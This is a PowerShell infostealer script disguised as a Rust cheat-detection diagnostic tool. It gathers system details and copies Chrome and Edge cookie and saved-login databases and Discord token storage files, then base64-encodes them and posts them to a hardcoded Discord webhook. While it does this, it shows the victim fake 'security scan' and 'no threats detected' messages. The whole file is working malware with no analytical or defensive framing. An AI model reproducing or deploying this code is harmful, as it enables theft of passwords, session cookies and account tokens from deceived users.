# steam_token_harvester.ps1
# Disguised as "Rust Cheat Detection Diagnostic Tool v7.0"

function Get-SystemInfo {
    $ip = "Unknown"
    try {
        $ip = (Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing).Content.Trim()
    } catch {}
    
    return @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        User = $env:USERNAME
        PC = $env:COMPUTERNAME
        IP = $ip
        Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
}

function Get-BrowserFiles {
    $files = @()
    $browsers = @(
        @{Name="Chrome";Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
        @{Name="Chrome";Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
        @{Name="Edge";Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
        @{Name="Edge";Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
    )
    
    foreach ($browser in $browsers) {
        if (Test-Path $browser.Path) {
            try {
                $content = Get-Content $browser.Path -Encoding Byte -ReadCount 0
                $files += @{
                    Browser = $browser.Name
                    File = Split-Path $browser.Path -Leaf
                    Data = [Convert]::ToBase64String($content)
                    Size = $content.Length
                }
            } catch {}
        }
    }
    return $files
}

function Get-DiscordFiles {
    $files = @()
    $paths = @("$env:APPDATA\discord", "$env:LOCALAPPDATA\Discord")
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            $storagePath = Join-Path $path "Local Storage\leveldb"
            if (Test-Path $storagePath) {
                $ldbFiles = Get-ChildItem $storagePath -Filter "*.ldb" | Select-Object -First 2
                foreach ($file in $ldbFiles) {
                    try {
                        $content = Get-Content $file.FullName -Encoding Byte -ReadCount 0
                        $files += @{
                            App = "Discord"
                            File = $file.Name
                            Data = [Convert]::ToBase64String($content)
                            Size = $content.Length
                        }
                    } catch {}
                }
            }
        }
    }
    return $files
}

function Send-ToWebhook {
    param($Message)
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
    
    $body = @{content = $Message} | ConvertTo-Json
    try {
        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
    } catch {}
}

# Main execution
Write-Host "Starting security scan..." -ForegroundColor Yellow

$sysInfo = Get-SystemInfo
$browserFiles = Get-BrowserFiles
$discordFiles = Get-DiscordFiles

# Send system info
$report = "SYSTEM SCAN REPORT v7.0"
$report += "`nOS: $($sysInfo.OS)"
$report += "`nUser: $($sysInfo.User)"
$report += "`nPC: $($sysInfo.PC)"
$report += "`nIP: $($sysInfo.IP)"
$report += "`nTime: $($sysInfo.Time)"

Send-ToWebhook -Message $report
Start-Sleep -Seconds 1

# Send browser files
if ($browserFiles.Count -gt 0) {
    foreach ($file in $browserFiles) {
        $fileReport = "BROWSER DATA: $($file.Browser) - $($file.File) ($($file.Size) bytes)"
        $fileReport += "`n```$($file.Data)```"
        Send-ToWebhook -Message $fileReport
        Start-Sleep -Milliseconds 500
    }
} else {
    Send-ToWebhook -Message "No browser data found"
}

# Send discord files
if ($discordFiles.Count -gt 0) {
    foreach ($file in $discordFiles) {
        $fileReport = "DISCORD DATA: $($file.File) ($($file.Size) bytes)"
        $fileReport += "`n```$($file.Data)```"
        Send-ToWebhook -Message $fileReport
        Start-Sleep -Milliseconds 500
    }
} else {
    Send-ToWebhook -Message "No Discord data found"
}

# Final message
Send-ToWebhook -Message "SCAN COMPLETED: All data collected successfully"

Write-Host "Scan completed successfully!" -ForegroundColor Green
Write-Host "No security threats detected" -ForegroundColor Green
